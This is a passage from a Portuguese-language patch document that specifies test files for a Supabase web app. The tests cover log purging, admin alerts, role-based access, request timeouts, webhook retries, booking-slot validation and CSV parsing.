INSERT INTO public.public_booking_rate_limits (email_normalized, bucket_start) VALUES
  ('old@rc12.test', now() - interval '10 days'), ('new@rc12.test', now());
INSERT INTO public.system_alerts (kind, severity, dedupe_key, created_at) VALUES
  ('rc12_old', 'low', 'rc12-old-alert', now() - interval '200 days'), ('rc12_new', 'low', 'rc12-new-alert', now() - interval '5 days');
INSERT INTO public.cron_job_runs (job_name, status, started_at) VALUES
  ('rc12-job-old', 'ok', now() - interval '120 days'), ('rc12-job-new', 'ok', now() - interval '1 day');
INSERT INTO public.webhook_inbox (provider, event_id, payload_hash, status, received_at) VALUES
  ('docusign', 'rc12-ev-old', 'h1', 'processed', now() - interval '200 days'), ('docusign', 'rc12-ev-new', 'h2', 'processed', now() - interval '2 days');

SELECT has_function('public', 'purge_operational_logs', ARRAY[]::text[], 'DBP-07: purge_operational_logs existe');
SELECT is(COALESCE(has_function_privilege('authenticated', to_regprocedure('public.purge_operational_logs()'), 'EXECUTE'), true), false, 'DBP-07: authenticated sem EXECUTE');
SELECT is(COALESCE(has_function_privilege('service_role', to_regprocedure('public.purge_operational_logs()'), 'EXECUTE'), false), true, 'DBP-07: service_role pode executar');
SELECT lives_ok($$SELECT public.purge_operational_logs()$$, 'DBP-07: a purga corre sem erro');
SELECT is((SELECT array_agg(error_id ORDER BY error_id) FROM public.client_error_logs WHERE error_id LIKE 'rc12-%'), ARRAY['rc12-new'], 'DBP-07: client_error_logs > 90 d apagado, recente mantido');
SELECT is((SELECT array_agg(email_normalized) FROM public.public_booking_rate_limits WHERE email_normalized LIKE '%@rc12.test'), ARRAY['new@rc12.test'], 'DBP-07: public_booking_rate_limits > 3 d apagado (e-mails de anonimos)');
SELECT is((SELECT array_agg(kind) FROM public.system_alerts WHERE kind LIKE 'rc12\_%'), ARRAY['rc12_new'], 'OPS-12: system_alerts > 180 d apagado');
SELECT is((SELECT array_agg(job_name) FROM public.cron_job_runs WHERE job_name LIKE 'rc12-job-%'), ARRAY['rc12-job-new'], 'OPS-12: cron_job_runs > 90 d apagado');
SELECT is((SELECT array_agg(event_id) FROM public.webhook_inbox WHERE event_id LIKE 'rc12-ev-%'), ARRAY['rc12-ev-new'], 'DBP-07: webhook_inbox processado > 180 d apagado');
SELECT is((public.purge_operational_logs() ->> 'client_error_logs')::int, 0, 'DBP-07: 2.a corrida nao apaga mais nada (idempotente)');
SELECT ok(to_regnamespace('cron') IS NULL OR EXISTS (SELECT 1 FROM cron.job WHERE jobname = 'purge-operational-logs-daily'), 'DBP-07: job pg_cron diario agendado');
SELECT ok(EXISTS (SELECT 1 FROM public.automation_health_expectations WHERE job_name = 'purge_operational_logs'), 'DBP-07: monitor de saude conhece a purga');

-- ================= alertas -> administradores (OPS-01) =================
INSERT INTO public.system_alerts (kind, severity, dedupe_key, payload) VALUES
  ('cron_stale', 'critical', 'rc12-a1', '{"job":"rc12-job"}'),
  ('cron_stale', 'critical', 'rc12-a2', '{"job":"rc12-job"}'),
  ('cron_stale', 'low', 'rc12-a3', '{"job":"rc12-job-low"}');
SELECT is((SELECT count(*)::int FROM public.notifications WHERE type = 'system_alert' AND user_id = 'a1200000-0000-4000-8000-0000000000b1'
             AND event_key LIKE 'system_alert:cron_stale:rc12-job%'), 1, 'OPS-01: 1 notificacao ao admin por tarefa/dia (critical repetido e low ignorados)');

-- ================= partial conta como execucao viva (OPS-04) =================
INSERT INTO public.cron_job_runs (job_name, status, started_at, triggered_by)
  SELECT 'sync-outlook-emails', 'partial', now() - (g * interval '5 minutes'), 'cron' FROM generate_series(0, 20) g;
DELETE FROM public.system_alerts WHERE dedupe_key LIKE 'cron_stale:sync-outlook-emails:%';
SELECT public.check_automation_health();
SELECT is((SELECT count(*)::int FROM public.system_alerts WHERE kind = 'cron_stale' AND payload ->> 'job' = 'sync-outlook-emails'), 0,
          'OPS-04: execucoes partial recentes nao geram alerta cron_stale falso');
SELECT is((SELECT health_state FROM public.automation_health_summary WHERE job_name = 'sync-outlook-emails'), 'OK', 'OPS-04: vista de saude mostra OK');

-- ================= URL base do cron (OPS-13) =================
SELECT ok((SELECT prosrc FROM pg_proc WHERE oid = 'public.cron_invoke_edge(text,jsonb)'::regprocedure) LIKE '%app.edge_base_url%', 'OPS-13: cron_invoke_edge le app.edge_base_url');

-- ================= integration_errors (SCH-02 / OPS-02) =================
SELECT has_table('public', 'integration_errors', 'SCH-02: tabela integration_errors existe');
SELECT lives_ok($$INSERT INTO public.integration_errors (integration_type, error_message, error_details) VALUES ('teams_transcript', 'rc12 e1', '{"a":1}')$$, 'SCH-02: escritor com integration_type+error_details grava');
SELECT lives_ok($$INSERT INTO public.integration_errors (source, error_message, metadata) VALUES ('outlook_graph', 'rc12 e2', '{"b":2}')$$, 'SCH-02: escritor so com source grava (o tipo vem do source)');
SELECT is((SELECT integration_type FROM public.integration_errors WHERE error_message = 'rc12 e2'), 'outlook_graph', 'SCH-02: integration_type normalizado a partir do source');
SELECT set_config('role', 'authenticated', true);
SELECT set_config('request.jwt.claims', '{"sub":"a1200000-0000-4000-8000-0000000000b1","role":"authenticated"}', true);
SELECT is((SELECT count(*)::int FROM public.integration_errors WHERE error_message LIKE 'rc12 e%'), 2, 'SCH-02: admin le os erros');
SELECT lives_ok($$UPDATE public.integration_errors SET resolved_at = now(), resolved_by = auth.uid() WHERE error_message = 'rc12 e1'$$, 'SCH-02: admin resolve um erro');
SELECT set_config('request.jwt.claims', '{"sub":"a1200000-0000-4000-8000-0000000000b2","role":"authenticated"}', true);
SELECT is((SELECT count(*)::int FROM public.integration_errors), 0, 'SCH-02: founder nao ve erros de integracao');
SELECT set_config('role', 'postgres', true);
SELECT set_config('request.jwt.claims', '', true);
SELECT is((SELECT count(*)::int FROM public.integration_errors WHERE error_message LIKE 'rc12 e%' AND resolved_at IS NOT NULL), 1, 'SCH-02: so o erro resolvido pelo admin ficou resolvido');

SELECT * FROM finish();
ROLLBACK;
```

### `src/lib/fetchWithTimeout.test.ts`
_(de: Timeout global de 30 s corta uploads, IA e importações (ids: HRD-01))_

**Alterar `src/lib/fetchWithTimeout.test.ts`** (diff; os números de linha são do ficheiro original):

```diff
--- a/src/lib/fetchWithTimeout.test.ts
+++ b/src/lib/fetchWithTimeout.test.ts
@@ -21,3 +21,23 @@ describe('request cancellation', () => {
     expect(await (await createFetchWithTimeout(fetcher)('https://example.test')).text()).toBe('ok');
   });
-});
\ No newline at end of file
+});
+
+describe('per-request deadlines', () => {
+  const slow = (ms: number): typeof fetch => async (_input, init) => new Promise<Response>((resolve, reject) => {
+    const t = setTimeout(() => resolve(new Response('ok')), ms);
+    init?.signal?.addEventListener('abort', () => { clearTimeout(t); reject(init.signal!.reason); }, { once: true });
+  });
+  it('keeps the short deadline for REST reads', async () => {
+    await expect(createFetchWithTimeout(slow(60), 20, 200, 200)('https://x.test/rest/v1/profiles')).rejects.toMatchObject({ name: 'TimeoutError' });
+  });
+  it('gives edge functions the long deadline', async () => {
+    const res = await createFetchWithTimeout(slow(60), 20, 200, 200)('https://x.test/functions/v1/analyze-pitch-deck', { method: 'POST' });
+    expect(await res.text()).toBe('ok');
+  });
+  it('gives storage uploads the upload deadline but not storage reads', async () => {
+    const f = createFetchWithTimeout(slow(60), 20, 200, 200);
+    expect(await (await f('https://x.test/storage/v1/object/docs/a.pdf', { method: 'POST' })).text()).toBe('ok');
+    await expect(f('https://x.test/storage/v1/object/docs/a.pdf')).rejects.toMatchObject({ name: 'TimeoutError' });
+    await expect(f('https://x.test/storage/v1/object/sign/docs/a.pdf', { method: 'POST' })).rejects.toMatchObject({ name: 'TimeoutError' });
+  });
+});
```

### `src/components/auth/SessionTimeoutWarning.test.tsx`
_(de: Timeout de inatividade de um separador expulsa o utilizador que trabalha noutro (ids: FEX-03))_

**Criar `src/components/auth/SessionTimeoutWarning.test.tsx`** (conteúdo exato):

```
import { act, render } from '@testing-library/react';
import { afterEach, beforeEach, describe, expect, it, vi } from 'vitest';

const signOut = vi.fn();
vi.mock('@/contexts/AuthContext', () => ({ useAuth: () => ({ signOut, session: null }) }));
vi.mock('@/lib/supabaseClient', () => ({ supabase: { auth: { refreshSession: vi.fn() } } }));
vi.mock('@/lib/logger', () => ({ logger: { error: vi.fn(), warn: vi.fn(), info: vi.fn() } }));
vi.mock('react-i18next', () => ({
  useTranslation: () => ({ t: (_k: string, d?: string) => (typeof d === 'string' ? d : _k) }),
}));

import { SessionTimeoutWarning } from './SessionTimeoutWarning';

const HOUR = 60 * 60 * 1000;

describe('SessionTimeoutWarning (activity shared across tabs)', () => {
  beforeEach(() => {
    vi.useFakeTimers();
    vi.setSystemTime(new Date('2026-11-02T09:00:00Z'));
    localStorage.clear();
    signOut.mockClear();
  });
  afterEach(() => vi.useRealTimers());

  it('does not sign out an idle tab while another tab keeps writing activity', () => {
    render(<SessionTimeoutWarning timeoutMs={8 * HOUR} warningTimeMs={10 * 60 * 1000} />);
    for (let h = 0; h < 9; h++) {
      act(() => { vi.advanceTimersByTime(HOUR - 1000); });
      localStorage.setItem('sl-last-activity', String(Date.now())); // activity in the other tab
      act(() => { vi.advanceTimersByTime(1000); });
    }
    expect(signOut).not.toHaveBeenCalled();
  });

  it('still signs out after the timeout when no tab shows activity', () => {
    render(<SessionTimeoutWarning timeoutMs={8 * HOUR} warningTimeMs={10 * 60 * 1000} />);
    act(() => { vi.advanceTimersByTime(8 * HOUR + 2000); });
    expect(signOut).toHaveBeenCalled();
  });
});
```

### `src/lib/lazyWithRetry.storage.test.ts`
_(de: Com o armazenamento do browser a lançar erros, páginas lazy e painéis rebentam (ids: FEF-05))_

**Criar `src/lib/lazyWithRetry.storage.test.ts`** (conteúdo exato):

```
import { afterEach, describe, expect, it, vi } from 'vitest';
import { lazyWithRetry } from './lazyWithRetry';

describe('lazyWithRetry com sessionStorage bloqueado', () => {
  afterEach(() => vi.restoreAllMocks());
  it('carrega o módulo mesmo quando sessionStorage lança SecurityError', async () => {
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => { throw new DOMException('blocked', 'SecurityError'); });
    vi.spyOn(Storage.prototype, 'removeItem').mockImplementation(() => { throw new DOMException('blocked', 'SecurityError'); });
    const loader = lazyWithRetry(() => Promise.resolve({ default: () => null }), 'k');
    await expect(loader()).resolves.toBeTruthy();
  });
});
```

### `src/hooks/useChecklistRecovery.storage.test.tsx`
_(de: Com o armazenamento do browser a lançar erros, páginas lazy e painéis rebentam (ids: FEF-05))_

**Criar `src/hooks/useChecklistRecovery.storage.test.tsx`** (conteúdo exato):

```
import { renderHook } from '@testing-library/react';
import { afterEach, describe, expect, it, vi } from 'vitest';
import { useChecklistRecovery } from './useChecklistRecovery';

describe('useChecklistRecovery com armazenamento bloqueado', () => {
  afterEach(() => vi.restoreAllMocks());
  it('não lança quando localStorage.getItem lança SecurityError', () => {
    vi.spyOn(Storage.prototype, 'getItem').mockImplementation(() => { throw new DOMException('blocked', 'SecurityError'); });
    vi.spyOn(Storage.prototype, 'setItem').mockImplementation(() => { throw new DOMException('blocked', 'SecurityError'); });
    const { result } = renderHook(() => useChecklistRecovery('u1'));
    expect(result.current.canRestore).toBe(false);
    expect(() => result.current.dismissChecklist()).not.toThrow();
  });
});
```

### `supabase/functions/_shared/webhookInbox_test.ts`
_(de: Entregas de webhook que ficam em 'received' são dadas como duplicadas e o evento perde-se (ids: SIGN-02, HRD-03))_

**Alterar `supabase/functions/_shared/webhookInbox_test.ts`** (diff; os números de linha são do ficheiro original):

```diff
--- a/supabase/functions/_shared/webhookInbox_test.ts
+++ b/supabase/functions/_shared/webhookInbox_test.ts
@@ -97,4 +97,5 @@ function updateChain(result: { data: { id: string } | null; error: { message: st
   const chain = {
     eq: (_key: string, _value: unknown) => chain,
+    lt: (_key: string, _value: unknown) => chain,
     select: (_fields: string) => chain,
     maybeSingle: async () => result,
@@ -348,2 +349,35 @@ Deno.test("retry simulation: XML-style deliveries (event_id=null) dedupe on payl
   assertEquals(store.size, 2);
 });
+
+Deno.test("claimWebhookDelivery: abandoned 'received' delivery (older than 10 min) is reclaimed on retry", async () => {
+  const updates: Array<{ eq: Array<[string, unknown]>; lt: Array<[string, unknown]> }> = [];
+  const client = {
+    from() {
+      return {
+        insert: () => ({
+          select: () => ({
+            single: async () => ({ data: null, error: { code: "23505", message: "unique_violation" } }),
+          }),
+        }),
+        update() {
+          const rec = { eq: [] as Array<[string, unknown]>, lt: [] as Array<[string, unknown]> };
+          updates.push(rec);
+          // Só a 2.ª tentativa (status='received' + received_at < limite) encontra a linha abandonada
+          const chain = {
+            eq: (k: string, v: unknown) => { rec.eq.push([k, v]); return chain; },
+            lt: (k: string, v: unknown) => { rec.lt.push([k, v]); return chain; },
+            select: () => chain,
+            maybeSingle: async () => (rec.lt.length > 0 ? { data: { id: "inbox-stale" }, error: null } : { data: null, error: null }),
+          };
+          return chain;
+        },
+      };
+    },
+  };
+  const result = await claimWebhookDelivery(client, baseInput);
+  assertEquals(result, { ok: true, inboxId: "inbox-stale", duplicate: false });
+  assertEquals(updates.length, 2);
+  assert(updates[0].eq.some(([k, v]) => k === "status" && v === "failed"));
+  assert(updates[1].eq.some(([k, v]) => k === "status" && v === "received"));
+  assertEquals(updates[1].lt[0][0], "received_at");
+});
```

### `supabase/functions/_shared/lifecycleSyncResultHandler_test.ts`
_(de: Alerta "Sincronização contratual falhou" repetido a todo o staff em cada corrida da recuperação (ids: E2E-06))_

**Criar `supabase/functions/_shared/lifecycleSyncResultHandler_test.ts`** (conteúdo exato):

```
import { assertEquals } from 'https://deno.land/std@0.224.0/assert/mod.ts';
import { handleLifecycleSyncResult } from './lifecycleSyncResultHandler.ts';

// Cliente falso: guarda as chaves de evento já vistas e devolve 23505 à segunda escrita (como o índice notifications_event_key_user_unique)
function fakeClient() {
  const seen = new Set<string>();
  const audit: unknown[] = [];
  const client = {
    from(table: string) {
      return {
        select: () => ({ in: () => Promise.resolve({ data: [{ user_id: 'u1' }, { user_id: 'u2' }], error: null }) }),
        insert: (rows: any) => {
          if (table === 'contract_lifecycle_events') { audit.push(rows); return Promise.resolve({ error: null }); }
          const dup = rows.some((r: any) => seen.has(`${r.user_id}|${r.event_key}`));
          if (dup) return Promise.resolve({ error: { code: '23505', message: 'duplicate key' } });
          rows.forEach((r: any) => seen.add(`${r.user_id}|${r.event_key}`));
          return Promise.resolve({ error: null });
        },
      };
    },
  };
  return { client, audit };
}
Deno.test('Mesmo erro no mesmo contrato avisa e regista uma só vez', async () => {
  const { client, audit } = fakeClient();
  const ctx = { contractId: 'c1', workspaceId: null, source: 'activation_recovery', operation: 'completed' as const };
  const r = { synced: false, errors: ['workspace_not_linked'] };
  assertEquals(await handleLifecycleSyncResult(client, r, ctx), false);
  assertEquals(await handleLifecycleSyncResult(client, r, ctx), false);
  assertEquals(await handleLifecycleSyncResult(client, r, ctx), false);
  assertEquals(audit.length, 1);
});
Deno.test('Erro diferente no mesmo contrato volta a avisar', async () => {
  const { client, audit } = fakeClient();
  const ctx = { contractId: 'c1', workspaceId: null, source: 'activation_recovery', operation: 'completed' as const };
  await handleLifecycleSyncResult(client, { synced: false, errors: ['workspace_not_linked'] }, ctx);
  await handleLifecycleSyncResult(client, { synced: false, errors: ['workspace_activate: not_active'] }, ctx);
  assertEquals(audit.length, 2);
});
Deno.test('Sem erros não avisa', async () => {
  const { client, audit } = fakeClient();
  assertEquals(await handleLifecycleSyncResult(client, { synced: true }, { contractId: 'c1', workspaceId: null, source: 's', operation: 'completed' }), true);
  assertEquals(audit.length, 0);
});
```

### `supabase/functions/_shared/lifecycleSync_test.ts`
_(de: A sincronização de ativação não reativa workspaces arquivados, não cria a conta do founder quando o workspace já está ativo, duplica emails e rebaixa leads (ids: E2E-01, E2E-03, SIGN-07, E2E-09, E2E-10, E2E-08, SIGN-06, SIGN-08, FEX-05 parcial))_

**Alterar `supabase/functions/_shared/lifecycleSync_test.ts`** (diff; os números de linha são do ficheiro original):

```diff
--- a/supabase/functions/_shared/lifecycleSync_test.ts
+++ b/supabase/functions/_shared/lifecycleSync_test.ts
@@ -4,4 +4,5 @@ import { syncIntakeOnCompleted } from './lifecycleSync.ts';
 function fakeClient({ signed = true, memberError = false, active = false, crmError = false, intakeStatus = 'signed' } = {}) {
   const writes: Array<{ table: string; payload: Record<string, unknown> }> = [];
+  const notCalls: Array<{ table: string; args: unknown[] }> = [];
   const client = {
     rpc: () => Promise.resolve({ data: 'ws-1', error: null }),
@@ -22,4 +23,5 @@ function fakeClient({ signed = true, memberError = false, active = false, crmErr
         select: () => chain, eq: () => chain, order: () => chain, limit: () => chain,
         in: () => chain, is: () => chain,
+        not: (...args: unknown[]) => { notCalls.push({ table, args }); return chain; },
         update: (p: Record<string, unknown>) => { operation = 'write'; payload = p; return chain; },
         insert: (p: Record<string, unknown>) => { operation = 'write'; payload = p; return chain; },
@@ -30,5 +32,5 @@ function fakeClient({ signed = true, memberError = false, active = false, crmErr
     },
   };
-  return { client, writes };
+  return { client, writes, notCalls };
 }
 Deno.test('Caller workspace never overrides the signed contract workspace', async () => {
@@ -82,3 +84,15 @@ Deno.test('CRM failure keeps durable recovery pending', async () => {
   assertEquals(result.synced, false);
   assertEquals(writes.some(w => w.payload.activation_sync_pending === false), false);
-});
\ No newline at end of file
+});
+Deno.test('Archived workspace is reactivated like the manual route (archived_at cleared)', async () => {
+  const { client, writes } = fakeClient({ active: true });
+  await syncIntakeOnCompleted(client, 'contract-1', 'ws-1', null, 'test');
+  const wsWrite = writes.find(w => w.table === 'workspaces' && w.payload.status === 'active');
+  assertEquals(wsWrite?.payload.archived_at, null);
+});
+Deno.test('Signature never demotes a lead the staff already advanced', async () => {
+  const { client, notCalls } = fakeClient({ active: true });
+  await syncIntakeOnCompleted(client, 'contract-1', 'ws-1', null, 'test');
+  const guard = notCalls.find(c => c.table === 'funnel_items');
+  assertEquals(guard?.args, ['stage', 'in', '(contracted,incubating,accelerating,archived,rejected)']);
+});
```

### `supabase/functions/_shared/publicBookingSlot_test.ts`
_(de: Marcação pública de Primeiro Contacto: horário não validado, falha parcial do calendário, leads duplicadas e textos com escape HTML (ids: CRM-02, CRM-03, CRM-04, CRM-05, FEX-05, FEX-16))_

**Criar `supabase/functions/_shared/publicBookingSlot_test.ts`** (conteúdo exato):

```
import { assertEquals } from "https://deno.land/std@0.168.0/testing/asserts.ts";
import { isOfferedSlot } from "./publicBookingSlot.ts";

// 2026-11-02 (segunda-feira) 09:00 em Lisboa (WET, UTC+0)
const NOW = Date.parse("2026-11-02T09:00:00Z");

Deno.test("aceita o proximo dia util na grelha oferecida", () => {
  assertEquals(isOfferedSlot("2026-11-03", "10:00", NOW), true);
  assertEquals(isOfferedSlot("2026-11-03", "16:00", NOW), true);
  assertEquals(isOfferedSlot("2026-11-16", "10:00", NOW), true);
});

Deno.test("rejeita passado, fim de semana e horas fora da grelha", () => {
  assertEquals(isOfferedSlot("2020-01-06", "10:00", NOW), false);
  assertEquals(isOfferedSlot("2026-11-02", "09:00", NOW), false); // ja nao esta no futuro
  assertEquals(isOfferedSlot("2026-11-07", "10:00", NOW), false); // sabado
  assertEquals(isOfferedSlot("2026-11-08", "10:00", NOW), false); // domingo
  assertEquals(isOfferedSlot("2026-11-03", "03:00", NOW), false);
  assertEquals(isOfferedSlot("2026-11-03", "12:00", NOW), false);
  assertEquals(isOfferedSlot("2026-11-03", "99:99", NOW), false);
});

Deno.test("rejeita datas inexistentes e demasiado longe sem lancar", () => {
  assertEquals(isOfferedSlot("2026-13-45", "10:00", NOW), false);
  assertEquals(isOfferedSlot("2026-02-31", "10:00", NOW), false);
  assertEquals(isOfferedSlot("2026-11-31", "10:00", NOW), false);
  assertEquals(isOfferedSlot("9999-99-99", "10:00", NOW), false);
  assertEquals(isOfferedSlot("2026-12-15", "10:00", NOW), false); // +43 dias
});

Deno.test("usa a hora de Lisboa no verao (WEST, UTC+1)", () => {
  const now = Date.parse("2026-07-10T08:00:00Z");
  assertEquals(isOfferedSlot("2026-07-13", "09:00", now), true);
  assertEquals(isOfferedSlot("2026-07-10", "09:00", now), false); // 09:00 WEST = 08:00Z, nao e futuro
});
```

### `src/hooks/useConsultantCalendar.rc12.test.ts`
_(de: Validação de slot do consultor: sessões de 90 e 120 min dão sempre «ocupado», dia todo ocupado dá «disponível» e erro do Graph dá tudo livre (ids: ED4-05, ED4-06))_

**Criar `src/hooks/useConsultantCalendar.rc12.test.ts`** (conteúdo exato):

```
import { createElement, type ReactNode } from 'react';
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { renderHook, waitFor } from '@testing-library/react';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { useValidateBookingSlot } from './useConsultantCalendar';

interface TimeSlot { start: string; end: string; available: boolean }
// Generate time slots for a day with availability info
function generateDaySlots(
  date: string,
  availabilityView: string,
  durationMinutes: number = 60
): TimeSlot[] {
  const slots: TimeSlot[] = [];
  const workStart = 9; // 9 AM
  const workEnd = 18; // 6 PM
  
  // availabilityView is a string where each char represents 30 min
  // 0 = free, 1 = tentative, 2 = busy, 3 = out of office, 4 = working elsewhere
  
  for (let hour = workStart; hour < workEnd; hour++) {
    for (let minute = 0; minute < 60; minute += 30) {
      const slotEndHour = hour + Math.floor((minute + durationMinutes) / 60);
      const slotEndMinute = (minute + durationMinutes) % 60;
      
      if (slotEndHour > workEnd || (slotEndHour === workEnd && slotEndMinute > 0)) {
        continue; // Slot would exceed working hours
      }
      
      const startStr = `${date}T${hour.toString().padStart(2, '0')}:${minute.toString().padStart(2, '0')}:00`;
      const endStr = `${date}T${slotEndHour.toString().padStart(2, '0')}:${slotEndMinute.toString().padStart(2, '0')}:00`;
      
      // Calculate which 30-min blocks this slot spans
      const slotStartIndex = (hour - workStart) * 2 + (minute === 30 ? 1 : 0);
      const blocksNeeded = Math.ceil(durationMinutes / 30);
      
      let isAvailable = true;
      for (let i = 0; i < blocksNeeded && slotStartIndex + i < availabilityView.length; i++) {
        const status = availabilityView[slotStartIndex + i];
        if (status !== '0') {
          isAvailable = false;
          break;
        }
      }
      
      slots.push({
        start: startStr,
        end: endStr,
        available: isAvailable,
      });
    }
  }
  
  return slots;
}

const state = vi.hoisted(() => ({ view: '', invoke: vi.fn() }));
vi.mock('@/lib/invokeWithAuth', () => ({ invokeWithAuth: state.invoke }));
vi.mock('@/lib/supabaseClient', () => ({ supabase: {} }));
vi.mock('@/lib/logger', () => ({ logger: { error: vi.fn(), warn: vi.fn(), info: vi.fn() } }));
function wrapper({ children }: { children: ReactNode }) {
  return createElement(QueryClientProvider, { client: new QueryClient({ defaultOptions: { queries: { retry: false } } }) }, children);
}
// servidor simulado = generateDaySlots real + filtro de disponiveis (check-consultant-availability/index.ts:348,361)
beforeEach(() => {
  state.invoke.mockReset();
  state.invoke.mockImplementation(async (_fn: string, opts: { body: { date: string; durationMinutes?: number } }) => {
    const slots = generateDaySlots(opts.body.date, state.view, opts.body.durationMinutes ?? 60).filter((s) => s.available);
    return { data: { success: true, slots }, error: null };
  });
});
const req = (min: number) => {
  const start = new Date('2026-11-03T14:00:00Z'); // 14:00 em Lisboa (inverno, UTC+0)
  return { workspaceId: 'w', startTime: start.toISOString(), endTime: new Date(start.getTime() + min * 60000).toISOString() };
};
describe('useValidateBookingSlot (RC12 ED4-05)', () => {
  const hook = useValidateBookingSlot;
  for (const min of [30, 60, 90, 120]) {
    it(`dia livre, sessao de ${min} min as 14:00 deve estar disponivel`, async () => {
      state.view = '0'.repeat(18);
      const { result } = renderHook(() => hook(), { wrapper });
      const r = await result.current.mutateAsync(req(min));
      expect({ min, available: r.available }).toEqual({ min, available: true });
    });
  }
  it('envia a duracao pedida ao servidor', async () => {
    state.view = '0'.repeat(18);
    const { result } = renderHook(() => hook(), { wrapper });
    await result.current.mutateAsync(req(90));
    expect(state.invoke.mock.calls[0][1].body.durationMinutes).toBe(90);
  });
  it('dia todo ocupado NAO deve estar disponivel', async () => {
    state.view = '2'.repeat(18);
    const { result } = renderHook(() => hook(), { wrapper });
    const r = await result.current.mutateAsync(req(60));
    expect(r.available).toBe(false);
  });
  it('14:00-15:00 ocupado: sessao de 60 min as 14:00 NAO esta disponivel', async () => {
    state.view = '000000000022222000'.slice(0, 18); // blocos 10 e 11 (14:00-15:00) ocupados
    const { result } = renderHook(() => hook(), { wrapper });
    expect((await result.current.mutateAsync(req(60))).available).toBe(false);
  });
  it('servidor sem dados (success:false) nao bloqueia: checked=false', async () => {
    state.invoke.mockResolvedValue({ data: { success: false, reason: 'no_schedule' }, error: null });
    const { result } = renderHook(() => hook(), { wrapper });
    const r = await result.current.mutateAsync(req(60));
    expect(r).toMatchObject({ available: true, checked: false, reason: 'no_schedule' });
  });
});
```

### `supabase/functions/_shared/importConfigCsv_test.ts`
_(de: A importação CSV de leads falha com ficheiros do Excel em português e lê "5.000" como 5 (ids: CRM-07, ED4-13))_

**Criar `supabase/functions/_shared/importConfigCsv_test.ts`** (conteúdo exato):

```
import { assertEquals } from 'https://deno.land/std@0.224.0/assert/mod.ts';
import { detectDelimiter, parseMoney } from './importConfigCsv.ts';

Deno.test('detectDelimiter: Excel PT usa ponto e vírgula', () => {
  assertEquals(detectDelimiter('Nome;Email;Telefone;Empresa\r\nAna;a@x.pt;1;X'), ';');
  assertEquals(detectDelimiter('﻿Nome;Email;Valor\n'), ';');
});

Deno.test('detectDelimiter: vírgula e tab', () => {
  assertEquals(detectDelimiter('name,email,phone\nAna,a@x.pt,1'), ',');
  assertEquals(detectDelimiter('name\temail\tphone\n'), '\t');
  assertEquals(detectDelimiter('name'), ',');
});

Deno.test('detectDelimiter: ignora separadores entre aspas no cabeçalho', () => {
  assertEquals(detectDelimiter('"Nome, completo",Email,Valor\n'), ',');
  assertEquals(detectDelimiter('"a;b;c",Email\n'), ',');
});

Deno.test('parseMoney: formato PT e EN', () => {
  assertEquals(parseMoney('5.000'), 5000);
  assertEquals(parseMoney('1.500,50'), 1500.5);
  assertEquals(parseMoney('1,500.50'), 1500.5);
  assertEquals(parseMoney('12,5'), 12.5);
  assertEquals(parseMoney('€ 2.000,00'), 2000);
  assertEquals(parseMoney('1.234.567'), 1234567);
  assertEquals(parseMoney('-3.000'), -3000);
});

Deno.test('parseMoney: decimais e valores ilegíveis', () => {
  assertEquals(parseMoney('1.5'), 1.5);
  assertEquals(parseMoney('0.500'), 0.5);
  assertEquals(parseMoney('1500'), 1500);
  assertEquals(parseMoney('abc'), null);
  assertEquals(parseMoney(''), null);
  assertEquals(parseMoney('  '), null);
});
```

### `src/pages/AdminDataImportRouter.rc12.test.tsx`
_(de: O roteador do importador de dados monta o importador antigo enquanto as flags carregam (ids: HRD-08))_

**Criar `src/pages/AdminDataImportRouter.rc12.test.tsx`** (conteúdo exato):

```
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { render, screen } from '@testing-library/react';

const flagsState: { data: unknown; isError: boolean; refetch: () => void; v2: boolean } = {
  data: undefined, isError: false, refetch: vi.fn(), v2: false,
};

vi.mock('react-i18next', () => ({
  useTranslation: () => ({ t: (_k: string, d?: string) => d ?? _k }),
}));
vi.mock('@/hooks/useFeatureFlags', () => ({
  useFeatureFlags: () => ({ data: flagsState.data, isError: flagsState.isError, refetch: flagsState.refetch }),
  useFeatureFlag: () => flagsState.v2,
}));
vi.mock('./AdminDataImport', () => ({ default: () => <div>importador-antigo</div> }));
vi.mock('./AdminDataImportV2', () => ({ default: () => <div>importador-v2</div> }));

import AdminDataImportRouter from './AdminDataImportRouter';

describe('AdminDataImportRouter (HRD-08)', () => {
  beforeEach(() => {
    flagsState.data = undefined;
    flagsState.isError = false;
    flagsState.v2 = false;
  });

  it('não monta nenhum importador enquanto as flags carregam', () => {
    render(<AdminDataImportRouter />);
    expect(screen.queryByText('importador-antigo')).toBeNull();
    expect(screen.queryByText('importador-v2')).toBeNull();
  });

  it('mostra aviso e botão de repetir quando a 1.ª leitura falha', () => {
    flagsState.isError = true;
    render(<AdminDataImportRouter />);
    expect(screen.getByText('Não foi possível confirmar qual o importador ativo.')).toBeTruthy();
    expect(screen.getByRole('button', { name: 'Tentar novamente' })).toBeTruthy();
    expect(screen.queryByText('importador-antigo')).toBeNull();
  });

  it('monta o importador antigo com flags carregadas e V2 desligado', async () => {
    flagsState.data = [];
    render(<AdminDataImportRouter />);
    expect(await screen.findByText('importador-antigo')).toBeTruthy();
  });

  it('monta o V2 com flags carregadas e V2 ligado', async () => {
    flagsState.data = [{ key: 'hubspot_importer_v2' }];
    flagsState.v2 = true;
    render(<AdminDataImportRouter />);
    expect(await screen.findByText('importador-v2')).toBeTruthy();
  });
});
```

### `supabase/functions/_shared/cronRunAuth_test.ts`
_(de: withCronRunLogging grava uma linha por cada pedido anónimo (ids: ED4-08, ED3-11, OPS-09))_

**Criar `supabase/functions/_shared/cronRunAuth_test.ts`** (conteúdo exato):

```
import { assertEquals } from 'https://deno.land/std@0.224.0/assert/mod.ts';
import { withCronRunLogging } from './cronRun.ts';

Deno.test('401/403 nao geram linha em cron_job_runs; 200 e 500 sim', async () => {
  Deno.env.set('SUPABASE_URL', 'http://stub.local');
  Deno.env.set('SUPABASE_SERVICE_ROLE_KEY', 'k');
  const calls: string[] = [];
  const realFetch = globalThis.fetch;
  globalThis.fetch = ((input: Request | URL | string, init?: RequestInit) => {
    const url = typeof input === 'string' ? input : input instanceof URL ? input.href : input.url;
    if (url.includes('log_cron_job_run')) calls.push(String(init?.body ?? ''));
    return Promise.resolve(new Response('"00000000-0000-0000-0000-000000000000"', { status: 200, headers: { 'content-type': 'application/json' } }));
  }) as typeof fetch;
  try {
    for (const [status, expectedCalls] of [[401, 0], [403, 0], [200, 1], [500, 1]] as const) {
      calls.length = 0;
